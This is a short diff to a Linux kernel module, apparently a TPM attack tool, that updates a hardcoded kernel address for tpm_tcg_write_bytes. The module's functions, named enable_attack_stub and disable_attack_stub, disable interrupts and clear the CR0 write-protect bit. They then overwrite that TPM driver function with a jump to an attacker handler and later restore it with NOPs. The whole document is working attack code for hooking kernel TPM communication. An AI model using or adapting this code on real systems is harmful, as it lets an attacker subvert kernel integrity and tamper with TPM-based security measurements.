@@ -5,7 +5,7 @@
 #include <linux/fs.h>
 #include "tpmttl.h"
 
-unsigned long long tpm_tcg_write_bytes = 0xffffffff81642b40;
+unsigned long long ptpm_tcg_write_bytes = 0xffffffff81b2ef10;
 
 unsigned char  nop_stub[] = {0x90, 0x90, 0x90, 0x90, 0x90};
 unsigned char call_stub[] = {0xe8, 0xf1, 0xf2, 0xf3, 0xf4};
@@ -86,12 +86,12 @@ static void enable_attack_stub()
   local_irq_save(flags);
   write_cr0 (read_cr0 () & (~ 0x10000));
 
-  target_addr = tpm_tcg_write_bytes_handler - tpm_tcg_write_bytes - 5;  
+  target_addr = tpm_tcg_write_bytes_handler - ptpm_tcg_write_bytes - 5;  
   jmp_stub[1] = ((char*)&target_addr)[0];
   jmp_stub[2] = ((char*)&target_addr)[1];
   jmp_stub[3] = ((char*)&target_addr)[2];
   jmp_stub[4] = ((char*)&target_addr)[3];
-  memcpy((void*)tpm_tcg_write_bytes, jmp_stub, sizeof(jmp_stub));
+  memcpy((void*)ptpm_tcg_write_bytes, jmp_stub, sizeof(jmp_stub));
 
   write_cr0 (read_cr0 () | 0x10000);
   local_irq_restore(flags);
@@ -104,7 +104,7 @@ static void disable_attack_stub()
   unsigned long flags;
   local_irq_save(flags);
   write_cr0 (read_cr0 () & (~ 0x10000));
-  memcpy((void*)tpm_tcg_write_bytes, nop_stub, sizeof(nop_stub));
+  memcpy((void*)ptpm_tcg_write_bytes, nop_stub, sizeof(nop_stub));
   write_cr0 (read_cr0 () | 0x10000);
   local_irq_restore(flags);
 
